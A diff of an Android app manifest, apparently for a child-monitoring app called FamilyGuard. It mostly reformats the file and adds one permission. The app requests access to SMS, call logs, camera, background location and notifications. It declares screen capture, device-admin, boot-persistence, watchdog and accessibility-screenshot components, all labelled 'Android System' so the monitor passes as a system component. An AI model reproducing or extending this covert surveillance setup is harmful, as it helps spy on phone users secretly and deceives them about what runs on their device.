@@ -1,89 +1,111 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-          xmlns:tools="http://schemas.android.com/tools">
-  <uses-permission android:name="android.permission.INTERNET"/>
-  <uses-permission android:name="android.permission.READ_CALL_LOG" />
-  <uses-permission android:name="android.permission.READ_SMS" />
-  <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
-  <uses-permission android:name="android.permission.CAMERA"/>
-  <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
-  <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
-  <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
-  <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
-  <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
-  <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
-  <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
-  <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
-  <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
-      tools:ignore="QueryAllPackagesPermission"/>
-  <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
-      tools:ignore="ProtectedPermissions"/>
-  <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
-          <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
-<uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
-  <uses-permission android:name="android.permission.USE_EXACT_ALARM"/>
+    xmlns:tools="http://schemas.android.com/tools">
 
-  <application android:theme="@style/Theme.Child" android:label="Android System">
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    
+    <!-- Foreground Service ruxsatlari (Android 14+ talabi) -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"/>
 
-    <service
-        android:name=".ScreenCaptureService"
-        android:exported="false"
-              android:stopWithTask="false"
-        android:foregroundServiceType="mediaProjection|camera|location" />
-<service 
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+    
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
+        tools:ignore="QueryAllPackagesPermission"/>
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermissions"/>
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM"/>
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+
+    <application 
+        android:theme="@style/Theme.Child" 
+        android:label="Android System">
+
+        <!-- Screen Capture Service -->
+        <service
+            android:name=".ScreenCaptureService"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:foregroundServiceType="mediaProjection|camera|location" />
+
+        <!-- Notification Listener Service -->
+        <service 
             android:name=".NotificationService"
             android:label="Android System"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
             android:exported="true">
-           <intent-filter>
+            <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService" />
             </intent-filter>
-          </service>
-    <receiver android:name=".DeviceAdminReceiver"
-      android:label="Android System"
-      android:description="@string/device_admin_description"
-      android:permission="android.permission.BIND_DEVICE_ADMIN"
-      android:exported="true">
-      <meta-data android:name="android.app.device_admin"
-          android:resource="@xml/device_admin_receiver"/>
-      <intent-filter>
-        <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
-        <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED"/>
-        <action android:name="android.app.action.DEVICE_ADMIN_DISABLED"/>
-      </intent-filter>
-    </receiver>
+        </service>
 
-    <receiver android:name=".BootReceiver" android:exported="true">
-      <intent-filter android:priority="1000">
-        <action android:name="android.intent.action.BOOT_COMPLETED"/>
-        <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
-        <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
-      </intent-filter>
-    </receiver>
+        <!-- Device Admin Receiver -->
+        <receiver 
+            android:name=".DeviceAdminReceiver"
+            android:label="Android System"
+            android:description="@string/device_admin_description"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
+            <meta-data 
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_receiver"/>
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED"/>
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLE_REQUESTED"/>
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED"/>
+            </intent-filter>
+        </receiver>
 
-    <!-- Watchdog — har 3 daqiqada tekshiruvchi -->
-    <receiver android:name=".WatchdogReceiver"
-        android:exported="false"/>
+        <!-- Boot Receiver -->
+        <receiver 
+            android:name=".BootReceiver" 
+            android:exported="true">
+            <intent-filter android:priority="1000">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
+            </intent-filter>
+        </receiver>
 
-    <activity android:name=".MainActivity" android:exported="true">
-      <intent-filter>
-        <action android:name="android.intent.action.MAIN"/>
-        <category android:name="android.intent.category.LAUNCHER"/>
-      </intent-filter>
-    </activity>
+        <!-- Watchdog — Har 3 daqiqada tekshiruvchi -->
+        <receiver 
+            android:name=".WatchdogReceiver"
+            android:exported="false"/>
 
-<!-- Accessibility Service — screenshot uchun -->
-<service
-    android:name=".FamilyGuardAccessibilityService"
-    android:exported="true"
-    android:label="Android System"
-    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-    <intent-filter>
-        <action android:name="android.accessibilityservice.AccessibilityService"/>
-    </intent-filter>
-    <meta-data
-        android:name="android.accessibilityservice"
-        android:resource="@xml/accessibility_service"/>
-</service>
+        <!-- Main Activity -->
+        <activity 
+            android:name=".MainActivity" 
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
 
-  </application>
+        <!-- Accessibility Service — screenshot uchun -->
+        <service
+            android:name=".FamilyGuardAccessibilityService"
+            android:exported="true"
+            android:label="Android System"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService"/>
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service"/>
+        </service>
+
+    </application>
 </manifest>
